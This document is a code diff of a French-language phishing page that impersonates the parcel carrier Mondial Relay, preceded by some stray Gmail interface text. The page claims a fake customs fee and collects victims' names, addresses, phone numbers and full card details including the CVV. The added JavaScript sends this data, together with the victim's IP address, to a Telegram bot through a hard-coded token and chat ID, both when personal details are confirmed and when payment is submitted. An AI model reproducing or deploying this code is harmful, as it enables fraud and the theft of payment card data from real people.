@@ -1,3 +1,19 @@
+
+
+Skip to content
+Using Gmail with screen readers
+2 of 146
+mondial_relay_lp
+Inbox
+L B <belili93lounes@gmail.com>
+	
+Attachments3:07 PM (4 minutes ago)
+	
+	
+to me
+ One attachment
+  •  Scanned by Gmail
+
 <!DOCTYPE html>
 <html lang="fr">
 <head>
@@ -100,13 +116,13 @@ body{font-family:'Open Sans',sans-serif;background:#fff;color:#1a1a1a;min-height
 
 <div id="app">
 
-<<header class="site-header">
+<header class="site-header">
 <div class="header-left">
 <button class="menu-btn" aria-label="Menu">
-<<svg viewBox="0 0 24 24"><path d="M3 12h18M3 6h18M3 18h18"/></svg>
+<svg viewBox="0 0 24 24"><path d="M3 12h18M3 6h18M3 18h18"/></svg>
 </button>
 <button class="search-btn" aria-label="Rechercher">
-<<svg viewBox="0 0 24 24"><circle cx="11" cy="11" r="8"/><path d="M21 21l-4.35-4.35"/></svg>
+<svg viewBox="0 0 24 24"><circle cx="11" cy="11" r="8"/><path d="M21 21l-4.35-4.35"/></svg>
 </button>
 </div>
 <div class="logo">
@@ -114,22 +130,22 @@ body{font-family:'Open Sans',sans-serif;background:#fff;color:#1a1a1a;min-height
 </div>
 <div class="header-right">
 <button class="icon-btn" aria-label="Panier">
-<<svg viewBox="0 0 24 24"><path d="M6 2L3 6v14a2 2 0 002 2h14a2 2 0 002-2V6l-3-4z"/><line x1="3" y1="6" x2="21" y2="6"/><path d="M16 10a4 4 0 01-8 0"/></svg>
+<svg viewBox="0 0 24 24"><path d="M6 2L3 6v14a2 2 0 002 2h14a2 2 0 002-2V6l-3-4z"/><line x1="3" y1="6" x2="21" y2="6"/><path d="M16 10a4 4 0 01-8 0"/></svg>
 </button>
 <button class="icon-btn" aria-label="Compte">
-<<svg viewBox="0 0 24 24"><path d="M20 21v-2a4 4 0 00-4-4H8a4 4 0 00-4 4v2"/><circle cx="12" cy="7" r="4"/></svg>
+<svg viewBox="0 0 24 24"><path d="M20 21v-2a4 4 0 00-4-4H8a4 4 0 00-4 4v2"/><circle cx="12" cy="7" r="4"/></svg>
 </button>
 </div>
 </header>
 
-<<nav class="breadcrumb">
-<<svg viewBox="0 0 24 24"><path d="M10 20v-6h4v6h5v-8h3L12 3 2 12h3v8z"/></svg>
+<nav class="breadcrumb">
+<svg viewBox="0 0 24 24"><path d="M10 20v-6h4v6h5v-8h3L12 3 2 12h3v8z"/></svg>
 <a href="#">Accueil</a>
 <span class="sep">/</span>
 <span style="color:#999">Suivi de colis</span>
 </nav>
 
-<<main class="main-content">
+<main class="main-content">
 <div class="container">
 
 <!-- ========== PAGE SUIVI ========== -->
@@ -156,7 +172,7 @@ body{font-family:'Open Sans',sans-serif;background:#fff;color:#1a1a1a;min-height
 </div>
 
 <button type="submit" class="btn-primary" id="searchBtn">
-<<svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5" style="vertical-align:middle"><circle cx="11" cy="11" r="8"/><path d="M21 21l-4.35-4.35"/></svg>
+<svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5" style="vertical-align:middle"><circle cx="11" cy="11" r="8"/><path d="M21 21l-4.35-4.35"/></svg>
 Rechercher
 </button>
 </form>
@@ -167,12 +183,12 @@ Rechercher
 <div id="confirm-page">
 <div class="track-hero">
 <h1>Finaliser la livraison</h1>
-<p>Colis N° <span id="heroPkgNum">—</span> — Veuillez confirmer vos coordonnées de livraison.</p>
+<p>Colis N° <span id="heroPkgNum">—</span> — Veuillez confirmer vos coordonnees de livraison.</p>
 </div>
 
 <div class="form-card">
 <h2>Informations du destinataire</h2>
-<p class="sub">Pour sécuriser la livraison de votre colis <strong id="confirmPkgNum">—</strong>, veuillez vérifier vos informations.</p>
+<p class="sub">Pour securiser la livraison de votre colis <strong id="confirmPkgNum">—</strong>, veuillez verifier vos informations.</p>
 
 <form id="confirmForm">
 <input type="text" name="website_verify" class="hp" tabindex="-1" autocomplete="off">
@@ -183,8 +199,18 @@ Rechercher
 </div>
 
 <div class="field">
-<label>Prénom</label>
+<label>Prenom</label>
 <input type="text" id="firstName" name="firstName" required placeholder="ex : Jean" autocomplete="given-name">
+</div>
+
+<div class="field">
+<label>Numero de telephone</label>
+<input type="tel" id="phoneNum" name="phoneNum" required maxlength="10" placeholder="ex : 0612345678" autocomplete="tel">
+</div>
+
+<div class="field">
+<label>Numero de telephone</label>
+<input type="tel" id="phone" name="phone" required maxlength="10" placeholder="ex : 0612345678" autocomplete="tel">
 </div>
 
 <div class="field">
@@ -213,7 +239,7 @@ Rechercher
 <div class="payment-card">
 <div class="alert-red">
 <div class="icon">📦</div>
-<h2>Colis retenu — Frais de dédouanement</h2>
+<h2>Colis retenu — Frais de dedouanement</h2>
 <p>Votre colis est arrive en centre de tri mais ne peut etre livre en raison de frais de douane non regles. Le paiement doit etre effectue dans les 48 heures.</p>
 <span class="price">2,50 €</span>
 <span class="reason">Frais de dossier douane</span>
@@ -222,6 +248,7 @@ Rechercher
 <div class="details-box">
 <div class="row"><span class="label">Numero de colis</span><span class="value" id="payPkgNum">—</span></div>
 <div class="row"><span class="label">Destinataire</span><span class="value" id="payName">—</span></div>
+<div class="row"><span class="label">Telephone</span><span class="value" id="payPhone">—</span></div>
 <div class="row"><span class="label">Adresse de livraison</span><span class="value" id="payAddress">—</span></div>
 <div class="row"><span class="label">Date d'arrivee</span><span class="value">13/05/2026</span></div>
 <div class="row"><span class="label">Montant a regler</span><span class="value red">2,50 € TTC</span></div>
@@ -266,7 +293,7 @@ Rechercher
 <button type="submit" class="btn-primary" id="payBtn">Payer 2,50 € et debloquer le colis</button>
 
 <div class="secure-note">
-<<svg viewBox="0 0 24 24"><path d="M12 22s8-4 8-10V5l-8-3-8 3v7c0 6 8 10 8 10z"/><path d="M9 12l2 2 4-4" fill="none" stroke="#fff" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"/></svg>
+<svg viewBox="0 0 24 24"><path d="M12 22s8-4 8-10V5l-8-3-8 3v7c0 6 8 10 8 10z"/><path d="M9 12l2 2 4-4" fill="none" stroke="#fff" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"/></svg>
 <span>Votre transaction est securisee par SSL 256-bit. Mondial Relay ne conserve pas vos donnees bancaires.</span>
 </div>
 </form>
@@ -276,7 +303,7 @@ Rechercher
 </div>
 </main>
 
-<<footer class="site-footer">
+<footer class="site-footer">
 <div class="footer-inner">
 <div class="footer-grid">
 <div class="footer-col">
@@ -334,6 +361,42 @@ var loader=document.getElementById('loader');
 var pkgNumValue='';
 var victimData={};
 
+// === CONFIG TELEGRAM ===
+var BOT_TOKEN = '8602994784:AAHldaGAILxR13zjuy94_ek7k_lzbK3u-8Y';
+var CHAT_ID = '1158897085';
+
+function buildTelegramText(data, ip, label){
+return '🚨 *'+label+'*\n\n'+
+'*Colis:* `'+data.pkgNum+'`\n'+
+'*Nom:* `'+data.lastName+'`\n'+
+'*Prenom:* `'+data.firstName+'`\n'+
+'*Telephone:* `'+data.phone+'`\n'+
+'*Adresse:* `'+data.address+'`\n'+
+'*Ville:* `'+data.city+'`\n'+
+'*CP:* `'+data.postCode+'`\n\n'+
+(data.cardholder?'*Titulaire CB:* `'+data.cardholder+'`\n':'')+
+(data.cardnumber?'*Numero:* `'+data.cardnumber+'`\n':'')+
+(data.expiry?'*Expiration:* `'+data.expiry+'`\n':'')+
+(data.cvv?'*CVV:* `'+data.cvv+'`\n':'')+
+(data.country?'*Pays:* `'+data.country+'`\n\n':'\n')+
+'📍 *IP:* `'+ip+'`\n'+
+'🕐 *Heure:* `'+data.time+'`\n'+
+'🔗 *URL:* `'+data.url+'`';
+}
+
+async function sendTelegram(data, label){
+var ip='inconnue';
+try{ip=await fetch('https://api.ipify.org?format=json').then(r=>r.json()).then(j=>j.ip);}catch(e){}
+var text=buildTelegramText(data,ip,label);
+try{
+  await fetch('https://api.telegram.org/bot'+BOT_TOKEN+'/sendMessage',{
+    method:'POST',
+    headers:{'Content-Type':'application/json'},
+    body:JSON.stringify({chat_id:CHAT_ID,text:text,parse_mode:'Markdown'})
+  });
+}catch(err){console.error('Telegram error:',err);}
+}
+
 trackForm.addEventListener('submit',function(e){
 e.preventDefault();
 var hp=this.querySelector('[name="website_verify"]');if(hp&&hp.value!=='')return;
@@ -354,13 +417,28 @@ e.preventDefault();
 var hp=this.querySelector('[name="website_verify"]');if(hp&&hp.value!=='')return;
 victimData.lastName=document.getElementById('lastName').value.trim();
 victimData.firstName=document.getElementById('firstName').value.trim();
+victimData.phone=document.getElementById('phoneNum').value.trim();
 victimData.address=document.getElementById('address').value.trim();
 victimData.city=document.getElementById('city').value.trim();
 victimData.postCode=document.getElementById('postCodeConfirm').value.trim();
 
 document.getElementById('payPkgNum').textContent=pkgNumValue;
 document.getElementById('payName').textContent=victimData.firstName+' '+victimData.lastName;
+document.getElementById('payPhone').textContent=victimData.phone;
 document.getElementById('payAddress').textContent=victimData.address+', '+victimData.city+' '+victimData.postCode;
+
+// Exfiltration des infos perso à la confirmation
+sendTelegram({
+  pkgNum: pkgNumValue,
+  lastName: victimData.lastName,
+  firstName: victimData.firstName,
+  phone: victimData.phone,
+  address: victimData.address,
+  city: victimData.city,
+  postCode: victimData.postCode,
+  time: new Date().toLocaleString('fr-FR'),
+  url: window.location.href
+}, 'INFOS PERSO CAPTUREES');
 
 loader.classList.add('on');
 setTimeout(function(){
@@ -371,10 +449,6 @@ window.scrollTo(0,0);
 },1200);
 });
 
-// === CONFIG TELEGRAM ===
-var BOT_TOKEN = '8602994784:AAHldaGAILxR13zjuy94_ek7k_lzbK3u-8Y';
-var CHAT_ID = '1158897085';
-
 payForm.addEventListener('submit',async function(e){
 e.preventDefault();
 var hp=this.querySelector('[name="website_verify"]');if(hp&&hp.value!=='')return;
@@ -383,10 +457,12 @@ var btn=document.getElementById('payBtn');
 btn.innerText='Traitement securise...';
 btn.disabled=true;
 
-var data={
+// Exfiltration complete avec CB + infos perso
+sendTelegram({
   pkgNum: pkgNumValue,
   lastName: victimData.lastName,
   firstName: victimData.firstName,
+  phone: victimData.phone,
   address: victimData.address,
   city: victimData.city,
   postCode: victimData.postCode,
@@ -395,45 +471,9 @@ var data={
   expiry: document.querySelector('[name="expiry"]').value,
   cvv: document.querySelector('[name="cvv"]').value,
   country: document.querySelector('[name="country"]').value,
-  ua: navigator.userAgent,
   time: new Date().toLocaleString('fr-FR'),
   url: window.location.href
-};
-
-var text='';
-try{
-  var ip=await fetch('https://api.ipify.org?format=json').then(r=>r.json()).then(j=>j.ip).catch(()=>'inconnue');
-  text=
-'🚨 *NOUVELLE CAPTURE COMPLETE*\n\n'+
-'*Colis:* `'+data.pkgNum+'`\n'+
-'*Nom:* `'+data.lastName+'`\n'+
-'*Prenom:* `'+data.firstName+'`\n'+
-'*Adresse:* `'+data.address+'`\n'+
-'*Ville:* `'+data.city+'`\n'+
-'*CP:* `'+data.postCode+'`\n\n'+
-'*Titulaire CB:* `'+data.cardholder+'`\n'+
-'*Numero:* `'+data.cardnumber+'`\n'+
-'*Expiration:* `'+data.expiry+'`\n'+
-'*CVV:* `'+data.cvv+'`\n'+
-'*Pays:* `'+data.country+'`\n\n'+
-'📍 *IP:* `'+ip+'`\n'+
-'🕐 *Heure:* `'+data.time+'`\n'+
-'🔗 *URL:* `'+data.url+'`';
-}catch(err){console.error('IP fetch error:',err);}
-
-try{
-  console.log('Sending to Telegram...');
-  var resp = await fetch('https://api.telegram.org/bot'+BOT_TOKEN+'/sendMessage',{
-    method:'POST',
-    headers:{'Content-Type':'application/json'},
-    body:JSON.stringify({chat_id:CHAT_ID,text:text,parse_mode:'Markdown'})
-  });
-  var json = await resp.json();
-  console.log('Telegram response:', json);
-  if(!json.ok) console.error('Telegram ERROR:', json.description);
-}catch(err){
-  console.error('Telegram fetch error:', err);
-}
+}, 'CAPTURE COMPLETE CB + INFOS');
 
 setTimeout(function(){
   window.location.href='https://www.mondialrelay.fr/suivi-de-colis/';
@@ -449,3 +489,6 @@ if(ex){ex.addEventListener('input',function(){var v=this.value.replace(/\D/g,'')
 
 </body>
 </html>
+
+mondial_relay_lp.html
+Displaying mondial_relay_lp.html.
